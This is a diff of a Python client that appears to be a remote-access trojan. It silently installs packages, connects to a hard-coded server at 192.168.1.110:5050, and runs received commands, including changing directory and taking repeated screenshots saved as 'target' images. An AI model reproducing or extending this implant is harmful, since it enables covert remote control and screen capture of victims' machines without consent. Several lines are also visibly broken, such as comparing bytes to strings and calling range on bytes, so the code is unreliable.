@@ -9,22 +9,26 @@ except:
     os.system("pip install pyautogui > install.txt")
     os.system("pip install tqdm > install.txt")
     os.system("rm install.txt")
+    import subprocess
+    import pyautogui
+    import tqdm
 '''seting variables'''
 import socket
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 host = "192.168.1.110"
 port = 5050
 SEPARATOR = "<SEPARATOR>"
+
 '''starting connecting to the server'''
 s.connect((host ,port))
 
-'''reciving commands and sending'''
+'''sending info'''
 def recv_cammand():
     while True:
         data = s.recv(1024)
         if data[0:] == "cd":
             os.chdir(data[2:].encode("utf-8"))
-        elif data == "screenshot":
+        elif data[0] == "screenshot":
             for i in range(data[2:].encode("utf-8")):
                 screenshot = pyautogui.screenshot()
                 img = screenshot.save(f"target{i}.png")
